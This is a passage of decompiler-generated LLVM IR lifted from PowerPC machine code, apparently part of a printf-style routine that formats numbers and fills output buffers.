  br label %dec_label_pc_100127c8

dec_label_pc_100127a8:                            ; preds = %dec_label_pc_10012794, %dec_label_pc_1001278c
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100127bc

dec_label_pc_100127b0:                            ; preds = %dec_label_pc_10012778
  %v0_100127b0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100127b0 = icmp slt i32 %v0_100127b0, 102
  %v3_100127b0 = icmp eq i32 %v0_100127b0, 102
  store i1 %v1_100127b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100127b0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_100127b0, i32* %r4.global-to-local, align 4
  br i1 %v3_100127b0, label %dec_label_pc_100127c8thread-pre-split, label %dec_label_pc_100127bc

dec_label_pc_100127bc:                            ; preds = %dec_label_pc_100127b0, %dec_label_pc_100127a8
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_100127dc

dec_label_pc_100127c8thread-pre-split:            ; preds = %dec_label_pc_100127b0
  %v0_100127c8.pr = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100127c8

dec_label_pc_100127c8:                            ; preds = %dec_label_pc_100127c8thread-pre-split, %dec_label_pc_1001279c
  %v0_100127cc = phi i32 [ %v0_100127c8.pr, %dec_label_pc_100127c8thread-pre-split ], [ %v0_1001278c, %dec_label_pc_1001279c ]
  %v1_100127c8 = icmp slt i32 %v0_100127cc, 0
  %v2_100127c8 = icmp sgt i32 %v0_100127cc, 0
  %v3_100127c8 = icmp eq i32 %v0_100127cc, 0
  store i1 %v1_100127c8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_100127c8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_100127c8, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_100127cc, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_100127cc, -1
  br i1 %tmp78, label %dec_label_pc_100127dc, label %dec_label_pc_100127d4

dec_label_pc_100127d4:                            ; preds = %dec_label_pc_100127c8
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_100127d8 = load i32, i32* %r8.global-to-local, align 4
  %v3_100127d8 = add i32 %v2_100127d8, -1
  %v4_100127d8 = inttoptr i32 %v3_100127d8 to i8*
  store i8 48, i8* %v4_100127d8, align 1
  store i32 %v3_100127d8, i32* %r8.global-to-local, align 4
  %v1_100127f8.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1001280c.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_100127dc

dec_label_pc_100127dc:                            ; preds = %dec_label_pc_100127c8, %dec_label_pc_100127bc, %dec_label_pc_100127d4
  %v0_1001280c = phi i1 [ %v1_100127c8, %dec_label_pc_100127c8 ], [ false, %dec_label_pc_100127bc ], [ %v0_1001280c.pre, %dec_label_pc_100127d4 ]
  %v1_100127f8 = phi i32 [ %v1_10012784, %dec_label_pc_100127c8 ], [ %v1_10012784, %dec_label_pc_100127bc ], [ %v1_100127f8.pre, %dec_label_pc_100127d4 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_100127e8 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_100127e8, i32* %r0.global-to-local, align 4
  %v0_100127f0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100127f0 = add i32 %v0_100127f0, 1
  store i32 %v1_100127f0, i32* %r6.global-to-local, align 4
  %v2_100127f8 = sub i32 %v1_100127f8, %v1_100127f0
  store i32 %v2_100127f8, i32* %r11.global-to-local, align 4
  %v1_100127fc = inttoptr i32 %v0_100127f0 to i8*
  %v2_100127fc = load i8, i8* %v1_100127fc, align 1
  %v3_100127fc = zext i8 %v2_100127fc to i32
  store i32 %v3_100127fc, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_1001280c, label %dec_label_pc_1001286c, label %dec_label_pc_10012810

dec_label_pc_10012810:                            ; preds = %dec_label_pc_100127dc
  %v0_10012810 = load i32, i32* %r10.global-to-local, align 4
  %v2_10012810 = icmp slt i32 %v0_10012810, %v2_100127f8
  %v4_10012810 = icmp eq i32 %v0_10012810, %v2_100127f8
  store i1 %v2_10012810, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012810, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10012810, label %dec_label_pc_10012864, label %dec_label_pc_10012824

dec_label_pc_10012824:                            ; preds = %dec_label_pc_10012810
  %v2_10012824 = sub i32 %v0_10012810, %v2_100127f8
  store i32 %v2_10012824, i32* %r0.global-to-local, align 4
  %v4_10012824 = icmp sgt i32 %v2_10012824, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_10012824, label %dec_label_pc_10012840, label %dec_label_pc_10012830

dec_label_pc_10012830:                            ; preds = %dec_label_pc_10012824
  %v2_10012834 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10012834, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10012888

dec_label_pc_10012840:                            ; preds = %dec_label_pc_10012824
  store i32 ptrtoint (i32* @global_var_1001c2a3.1127 to i32), i32* %r9.global-to-local, align 4
  %v2_1001284c = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1001284c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_10012888

dec_label_pc_10012864:                            ; preds = %dec_label_pc_10012810
  %v0_10012864 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10012864, label %dec_label_pc_10012874, label %dec_label_pc_10012868

dec_label_pc_10012868:                            ; preds = %dec_label_pc_10012864
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001286c

dec_label_pc_1001286c:                            ; preds = %dec_label_pc_100127dc, %dec_label_pc_10012868
  %v2_1001286c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1001286c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012888

dec_label_pc_10012874:                            ; preds = %dec_label_pc_10012864
  %v2_10012874 = sub i32 %v2_100127f8, %v0_10012810
  store i32 %v2_10012874, i32* %r11.global-to-local, align 4
  %v2_1001287c = add i32 %v0_10012810, %v1_100127f0
  store i32 %v2_1001287c, i32* %r6.global-to-local, align 4
  %v2_10012880 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10012880, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012888

dec_label_pc_10012888:                            ; preds = %dec_label_pc_1001286c, %dec_label_pc_10012840, %dec_label_pc_10012830, %dec_label_pc_10012874
  %v1_100128b4 = phi i32 [ %v2_1001286c, %dec_label_pc_1001286c ], [ %v2_1001284c, %dec_label_pc_10012840 ], [ %v2_10012834, %dec_label_pc_10012830 ], [ %v2_10012880, %dec_label_pc_10012874 ]
  %v0_10012894 = phi i32 [ %v2_100127f8, %dec_label_pc_1001286c ], [ 0, %dec_label_pc_10012840 ], [ 0, %dec_label_pc_10012830 ], [ %v2_10012874, %dec_label_pc_10012874 ]
  %v3_10012888 = load i32, i32* %v2_10012458, align 4
  store i32 %v3_10012888, i32* %r0.global-to-local, align 4
  %v1_1001288c = and i32 %v3_10012888, 16
  store i32 %v1_1001288c, i32* %r9.global-to-local, align 4
  %v3_1001288c = icmp eq i32 %v1_1001288c, 0
  br i1 %v3_1001288c, label %dec_label_pc_10012894, label %dec_label_pc_100128ac

dec_label_pc_10012894:                            ; preds = %dec_label_pc_10012888
  %v1_10012894 = icmp slt i32 %v0_10012894, 0
  %v3_10012894 = icmp eq i32 %v0_10012894, 0
  store i1 %v1_10012894, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012894, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012894, label %dec_label_pc_1001289c, label %dec_label_pc_100128ac

dec_label_pc_1001289c:                            ; preds = %dec_label_pc_10012894
  %v0_1001289c = load i32, i32* %r31.global-to-local, align 4
  %v1_1001289c = icmp slt i32 %v0_1001289c, 103
  %v3_1001289c = icmp eq i32 %v0_1001289c, 103
  store i1 %v1_1001289c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001289c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001289c, label %dec_label_pc_100128cc, label %dec_label_pc_100128a4

dec_label_pc_100128a4:                            ; preds = %dec_label_pc_1001289c
  %v0_100128a4 = load i32, i32* %r30.global-to-local, align 4
  %v1_100128a4 = icmp slt i32 %v0_100128a4, 0
  %v3_100128a4 = icmp eq i32 %v0_100128a4, 0
  store i1 %v1_100128a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100128a4, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_100128a4, 1
  br i1 %tmp79, label %dec_label_pc_100128cc, label %dec_label_pc_100128ac

dec_label_pc_100128ac:                            ; preds = %dec_label_pc_10012894, %dec_label_pc_10012888, %dec_label_pc_100128a4
  %v2_100128b4 = inttoptr i32 %v1_100128b4 to i32*
  store i32 112, i32* %v2_100128b4, align 4
  store i32 ptrtoint (i32* @global_var_1001c2b0.1128 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100128c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100128c0 = add i32 %v1_100128c0, 8
  %v3_100128c0 = inttoptr i32 %v2_100128c0 to i32*
  store i32 ptrtoint (i32* @global_var_1001c2b0.1128 to i32), i32* %v3_100128c0, align 4
  %v0_100128c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100128c4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100128c4 = add i32 %v1_100128c4, 4
  %v3_100128c4 = inttoptr i32 %v2_100128c4 to i32*
  store i32 %v0_100128c4, i32* %v3_100128c4, align 4
  %v0_100128c8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100128c8 = add i32 %v0_100128c8, 12
  store i32 %v1_100128c8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100128cc

dec_label_pc_100128cc:                            ; preds = %dec_label_pc_100128a4, %dec_label_pc_1001289c, %dec_label_pc_100128ac
  %v1_100128dc = phi i32 [ %v1_100128b4, %dec_label_pc_100128a4 ], [ %v1_100128b4, %dec_label_pc_1001289c ], [ %v1_100128c8, %dec_label_pc_100128ac ]
  %v0_100128cc = load i32, i32* %r10.global-to-local, align 4
  %v1_100128cc = add i32 %v0_100128cc, 1
  store i32 %v1_100128cc, i32* %r10.global-to-local, align 4
  %v4_100128cc = icmp eq i32 %v1_100128cc, 0
  br i1 %v4_100128cc, label %dec_label_pc_100128f4, label %dec_label_pc_100128d4

dec_label_pc_100128d4:                            ; preds = %dec_label_pc_100128cc
  %v1_100128d4 = sub i32 -1, %v0_100128cc
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_100128dc = add i32 %v1_100128dc, 4
  %v3_100128dc = inttoptr i32 %v2_100128dc to i32*
  store i32 %v1_100128d4, i32* %v3_100128dc, align 4
  store i32 ptrtoint (i32* @global_var_1001c2a3.1127 to i32), i32* %r9.global-to-local, align 4
  %v0_100128e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100128e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_100128e8 = inttoptr i32 %v1_100128e8 to i32*
  store i32 %v0_100128e8, i32* %v2_100128e8, align 4
  %v0_100128ec = load i32, i32* %r9.global-to-local, align 4
  %v1_100128ec = load i32, i32* %r8.global-to-local, align 4
  %v2_100128ec = add i32 %v1_100128ec, 8
  %v3_100128ec = inttoptr i32 %v2_100128ec to i32*
  store i32 %v0_100128ec, i32* %v3_100128ec, align 4
  %v0_100128f0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100128f0 = add i32 %v0_100128f0, 12
  store i32 %v1_100128f0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100128f4

dec_label_pc_100128f4:                            ; preds = %dec_label_pc_100128cc, %dec_label_pc_100128d4
  %v1_10012900 = phi i32 [ %v1_100128dc, %dec_label_pc_100128cc ], [ %v1_100128f0, %dec_label_pc_100128d4 ]
  %v0_100128f4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100128f4 = icmp slt i32 %v0_100128f4, 0
  %v3_100128f4 = icmp eq i32 %v0_100128f4, 0
  store i1 %v1_100128f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100128f4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100128f4, label %dec_label_pc_10012910, label %dec_label_pc_100128fc

dec_label_pc_100128fc:                            ; preds = %dec_label_pc_100128f4
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_10012900 = load i32, i32* %r6.global-to-local, align 4
  %v2_10012900 = add i32 %v1_10012900, 8
  %v3_10012900 = inttoptr i32 %v2_10012900 to i32*
  store i32 %v0_10012900, i32* %v3_10012900, align 4
  %v0_10012904 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012904 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012904 = inttoptr i32 %v1_10012904 to i32*
  store i32 %v0_10012904, i32* %v2_10012904, align 4
  %v0_10012908 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012908 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012908 = add i32 %v1_10012908, 4
  %v3_10012908 = inttoptr i32 %v2_10012908 to i32*
  store i32 %v0_10012908, i32* %v3_10012908, align 4
  %v0_1001290c = load i32, i32* %r8.global-to-local, align 4
  %v1_1001290c = add i32 %v0_1001290c, 12
  store i32 %v1_1001290c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012910

dec_label_pc_10012910:                            ; preds = %dec_label_pc_100128f4, %dec_label_pc_100128fc
  %v1_10012938 = phi i32 [ %v1_10012900, %dec_label_pc_100128f4 ], [ %v1_1001290c, %dec_label_pc_100128fc ]
  %v0_10012910 = load i32, i32* %r31.global-to-local, align 4
  %v1_10012910 = icmp slt i32 %v0_10012910, 103
  %v3_10012910 = icmp eq i32 %v0_10012910, 103
  store i1 %v1_10012910, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012910, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012910, label %dec_label_pc_10012918, label %dec_label_pc_10012924

dec_label_pc_10012918:                            ; preds = %dec_label_pc_10012910
  %v3_10012918 = load i32, i32* %v2_10012458, align 4
  store i32 %v3_10012918, i32* %r0.global-to-local, align 4
  %v1_1001291c = and i32 %v3_10012918, 16
  store i32 %v1_1001291c, i32* %r9.global-to-local, align 4
  %v3_1001291c = icmp eq i32 %v1_1001291c, 0
  br i1 %v3_1001291c, label %dec_label_pc_10012950, label %dec_label_pc_10012924

dec_label_pc_10012924:                            ; preds = %dec_label_pc_10012910, %dec_label_pc_10012918
  %v0_10012924 = load i32, i32* %r10.global-to-local, align 4
  %v1_10012924 = load i32, i32* %r11.global-to-local, align 4
  %v2_10012924 = sub i32 %v1_10012924, %v0_10012924
  store i32 %v2_10012924, i32* %r9.global-to-local, align 4
  %v1_10012928 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012928 = icmp sgt i32 %v1_10012928, %v2_10012924
  %v4_10012928 = icmp eq i32 %v1_10012928, %v2_10012924
  store i1 %v2_10012928, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012928, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10012928, label %dec_label_pc_10012930, label %dec_label_pc_10012950

dec_label_pc_10012930:                            ; preds = %dec_label_pc_10012924
  %v2_10012930 = sub i32 %v1_10012928, %v2_10012924
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10012938 = add i32 %v1_10012938, 4
  %v3_10012938 = inttoptr i32 %v2_10012938 to i32*
  store i32 %v2_10012930, i32* %v3_10012938, align 4
  store i32 ptrtoint (i32* @global_var_1001c2a3.1127 to i32), i32* %r9.global-to-local, align 4
  %v0_10012944 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012944 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012944 = inttoptr i32 %v1_10012944 to i32*
  store i32 %v0_10012944, i32* %v2_10012944, align 4
  %v0_10012948 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012948 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012948 = add i32 %v1_10012948, 8
  %v3_10012948 = inttoptr i32 %v2_10012948 to i32*
  store i32 %v0_10012948, i32* %v3_10012948, align 4
  %v0_1001294c = load i32, i32* %r8.global-to-local, align 4
  %v1_1001294c = add i32 %v0_1001294c, 12
  store i32 %v1_1001294c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012950

dec_label_pc_10012950:                            ; preds = %dec_label_pc_10012924, %dec_label_pc_10012918, %dec_label_pc_10012930
  %v1_100129e437 = phi i32 [ %v1_10012938, %dec_label_pc_10012924 ], [ %v1_10012938, %dec_label_pc_10012918 ], [ %v1_1001294c, %dec_label_pc_10012930 ]
  %v0_10012950 = load i32, i32* %r4.global-to-local, align 4
  %v1_10012950 = icmp slt i32 %v0_10012950, 102
  %v3_10012950 = icmp eq i32 %v0_10012950, 102
  store i1 %v1_10012950, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012950, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012950, label %dec_label_pc_100129d8, label %dec_label_pc_10012958

dec_label_pc_10012958:                            ; preds = %dec_label_pc_10012950
  %v0_10012958 = load i32, i32* %r7.global-to-local, align 4
  %v1_10012958 = icmp slt i32 %v0_10012958, 0
  %v3_10012958 = icmp eq i32 %v0_10012958, 0
  store i1 %v1_10012958, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012958, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_10012958, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_10012958, -1
  br i1 %tmp80, label %dec_label_pc_10012974, label %dec_label_pc_1001296c

dec_label_pc_1001296c:                            ; preds = %dec_label_pc_10012958
  %v1_1001296c = sub i32 0, %v0_10012958
  store i32 %v1_1001296c, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10012974

dec_label_pc_10012974:                            ; preds = %dec_label_pc_10012958, %dec_label_pc_1001296c
  %v0_1001298831 = phi i32 [ %v0_10012958, %dec_label_pc_10012958 ], [ %v1_1001296c, %dec_label_pc_1001296c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10012978 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_10012978, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10012988

dec_label_pc_10012988:                            ; preds = %dec_label_pc_10012988.backedge, %dec_label_pc_10012974
  %v2_100129a8 = phi i32 [ %v3_100129a8, %dec_label_pc_10012988.backedge ], [ %v2_10012978, %dec_label_pc_10012974 ]
  %v0_1001298c = phi i32 [ %v0_1001298c.pre, %dec_label_pc_10012988.backedge ], [ 2, %dec_label_pc_10012974 ]
  %v1_10012988 = phi i32 [ %v1_10012988.pre, %dec_label_pc_10012988.backedge ], [ 10, %dec_label_pc_10012974 ]
  %v1_1001299c = phi i32 [ %v0_10012988.pre, %dec_label_pc_10012988.backedge ], [ %v0_1001298831, %dec_label_pc_10012974 ]
  %v2_10012988 = sdiv i32 %v1_1001299c, %v1_10012988
  store i32 %v2_10012988, i32* %r0.global-to-local, align 4
  %v1_1001298c = add i32 %v0_1001298c, 1
  store i32 %v1_1001298c, i32* %r7.global-to-local, align 4
  %v1_10012990 = icmp slt i32 %v1_1001298c, 3
  %v3_10012990 = icmp eq i32 %v1_1001298c, 3
  store i1 %v1_10012990, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012990, i1* %cr7_eq.global-to-local, align 1
  %v1_10012998 = icmp slt i32 %v2_10012988, 0
  %v2_10012998 = icmp sgt i32 %v2_10012988, 0
  %v3_10012998 = icmp eq i32 %v2_10012988, 0
  store i1 %v1_10012998, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10012998, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10012998, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_10012988, -10
  store i32 %v2_10012988, i32* %r11.global-to-local, align 4
  %v2_1001299c = add i32 %v1_1001299c, 48
  %v1_100129a4 = add i32 %v2_1001299c, %tmp81
  store i32 %v1_100129a4, i32* %r9.global-to-local, align 4
  %v1_100129a8 = trunc i32 %v1_100129a4 to i8
  %v3_100129a8 = add i32 %v2_100129a8, -1
  %v4_100129a8 = inttoptr i32 %v3_100129a8 to i8*
  store i8 %v1_100129a8, i8* %v4_100129a8, align 1
  store i32 %v3_100129a8, i32* %r10.global-to-local, align 4
  %v0_100129ac = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_100129ac = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_100129ac = or i1 %v0_100129ac, %v1_100129ac
  br i1 %v2_100129ac, label %dec_label_pc_10012988.backedge, label %dec_label_pc_100129b0

dec_label_pc_10012988.backedge:                   ; preds = %dec_label_pc_10012988, %dec_label_pc_100129b0
  %v0_10012988.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10012988.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1001298c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10012988

dec_label_pc_100129b0:                            ; preds = %dec_label_pc_10012988
  %v0_100129b0 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_100129b0, label %dec_label_pc_100129b4, label %dec_label_pc_10012988.backedge

dec_label_pc_100129b4:                            ; preds = %dec_label_pc_100129b0
  %v1_100129b4 = add i32 %v2_100129a8, -2
  store i32 %v1_100129b4, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_100129bc = add i32 %v2_100129a8, -3
  store i32 %v1_100129bc, i32* %r11.global-to-local, align 4
  %v0_100129c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100129c0 = trunc i32 %v0_100129c0 to i8
  %v4_100129c0 = inttoptr i32 %v1_100129b4 to i8*
  store i8 %v1_100129c0, i8* %v4_100129c0, align 1
  %v0_100129c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_100129c4 = trunc i32 %v0_100129c4 to i8
  %v2_100129c4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100129c4 = add i32 %v2_100129c4, -1
  %v4_100129c4 = inttoptr i32 %v3_100129c4 to i8*
  store i8 %v1_100129c4, i8* %v4_100129c4, align 1
  %v0_100129c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100129c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_100129c8 = inttoptr i32 %v1_100129c8 to i32*
  store i32 %v0_100129c8, i32* %v2_100129c8, align 4
  %v0_100129cc = load i32, i32* %r7.global-to-local, align 4
  %v1_100129cc = load i32, i32* %r8.global-to-local, align 4
  %v2_100129cc = add i32 %v1_100129cc, 4
  %v3_100129cc = inttoptr i32 %v2_100129cc to i32*
  store i32 %v0_100129cc, i32* %v3_100129cc, align 4
  %v0_100129d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100129d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100129d0 = add i32 %v1_100129d0, 8
  %v3_100129d0 = inttoptr i32 %v2_100129d0 to i32*
  store i32 %v0_100129d0, i32* %v3_100129d0, align 4
  %v0_100129d4 = load i32, i32* %r8.global-to-local, align 4
  %v1_100129d4 = add i32 %v0_100129d4, 12
  store i32 %v1_100129d4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100129d8

dec_label_pc_100129d8:                            ; preds = %dec_label_pc_10012950, %dec_label_pc_1001252c, %dec_label_pc_100129b4
  %v0_10012a54 = phi i32 [ %v1_100129e437, %dec_label_pc_10012950 ], [ %v2_10012538, %dec_label_pc_1001252c ], [ %v1_100129d4, %dec_label_pc_100129b4 ]
  %v2_100129d8 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_100129d8, i32* %r9.global-to-local, align 4
  %v1_100129e8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100129dc

dec_label_pc_100129dc:                            ; preds = %dec_label_pc_100129dc, %dec_label_pc_100129d8
  %v1_100129e8 = phi i32 [ %v2_100129e8, %dec_label_pc_100129dc ], [ %v1_100129e8.pre, %dec_label_pc_100129d8 ]
  %v0_100129dc = phi i32 [ %v1_100129e0, %dec_label_pc_100129dc ], [ %v2_100129d8, %dec_label_pc_100129d8 ]
  %v1_100129dc = inttoptr i32 %v0_100129dc to i32*
  %v2_100129dc = load i32, i32* %v1_100129dc, align 4
  store i32 %v2_100129dc, i32* %r0.global-to-local, align 4
  %v1_100129e0 = add i32 %v0_100129dc, 12
  store i32 %v1_100129e0, i32* %r9.global-to-local, align 4
  %v2_100129e4 = icmp ult i32 %v1_100129e0, %v0_10012a54
  %v2_100129e8 = sub i32 %v1_100129e8, %v2_100129dc
  store i32 %v2_100129e8, i32* @r28, align 4
  br i1 %v2_100129e4, label %dec_label_pc_100129dc, label %dec_label_pc_100129f0

dec_label_pc_100129f0:                            ; preds = %dec_label_pc_100129dc
  %v4_100129e4 = icmp eq i32 %v1_100129e0, %v0_10012a54
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100129e4, i1* %cr7_eq.global-to-local, align 1
  %v3_100129f0 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_10012a54, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_100129f0, 0
  %v1_10012a04 = zext i1 %tmp85 to i32
  store i32 %v1_10012a04, i32* %r9.global-to-local, align 4
  %v2_10012a08 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_10012a08, i32* %r0.global-to-local, align 4
  %v2_10012a0c = sub i32 %v2_100129e8, %v1_10012a04
  store i32 %v2_10012a0c, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_10012a0c, 1
  br i1 %tmp82, label %dec_label_pc_10012a78, label %dec_label_pc_10012a1c

dec_label_pc_10012a1c:                            ; preds = %dec_label_pc_100129f0
  %v3_10012a1c = load i32, i32* %v2_10012458, align 4
  store i32 %v3_10012a1c, i32* %r0.global-to-local, align 4
  %v1_10012a20 = and i32 %v3_10012a1c, 8
  store i32 %v1_10012a20, i32* %r7.global-to-local, align 4
  %v3_10012a20 = icmp eq i32 %v1_10012a20, 0
  br i1 %v3_10012a20, label %dec_label_pc_10012a44, label %dec_label_pc_10012a28

dec_label_pc_10012a28:                            ; preds = %dec_label_pc_10012a1c
  %v1_10012a2c = add i32 %v0_10012a54, 12
  store i32 %v1_10012a2c, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1001c2a3.1127 to i32), i32* %r9.global-to-local, align 4
  %v2_10012a34 = inttoptr i32 %v0_10012a54 to i32*
  store i32 160, i32* %v2_10012a34, align 4
  %v0_10012a38 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012a38 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012a38 = add i32 %v1_10012a38, 4
  %v3_10012a38 = inttoptr i32 %v2_10012a38 to i32*
  store i32 %v0_10012a38, i32* %v3_10012a38, align 4
  %v0_10012a3c = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a3c = load i32, i32* %r8.global-to-local, align 4
  %v2_10012a3c = add i32 %v1_10012a3c, 8
  %v3_10012a3c = inttoptr i32 %v2_10012a3c to i32*
  store i32 %v0_10012a3c, i32* %v3_10012a3c, align 4
  br label %dec_label_pc_10012a78

dec_label_pc_10012a44:                            ; preds = %dec_label_pc_10012a1c
  %v1_10012a44 = add i32 %tmp, 16
  %v2_10012a44 = inttoptr i32 %v1_10012a44 to i32*
  %v3_10012a44 = load i32, i32* %v2_10012a44, align 4
  store i32 %v3_10012a44, i32* %r0.global-to-local, align 4
  %v1_10012a48 = icmp slt i32 %v3_10012a44, 48
  %v3_10012a48 = icmp eq i32 %v3_10012a44, 48
  store i1 %v1_10012a48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012a48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012a48, label %dec_label_pc_10012a50, label %dec_label_pc_10012a6c

dec_label_pc_10012a50:                            ; preds = %dec_label_pc_10012a44
  %v3_10012a50 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_10012a54, i32* @r30, align 4
  %v2_10012a58 = add i32 %v3_10012a50, %v2_10012a0c
  store i32 %v2_10012a58, i32* %r0.global-to-local, align 4
  store i32 %v2_10012a58, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10012a78

dec_label_pc_10012a64:                            ; preds = %dec_label_pc_10012a80
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_10012ab4

dec_label_pc_10012a6c:                            ; preds = %dec_label_pc_10012a44
  store i32 %v2_100129e8, i32* %r0.global-to-local, align 4
  store i32 %v0_10012a54, i32* @r30, align 4
  br label %dec_label_pc_10012a78

dec_label_pc_10012a78:                            ; preds = %dec_label_pc_100129f0, %dec_label_pc_10012a50, %dec_label_pc_10012a28, %dec_label_pc_10012a6c
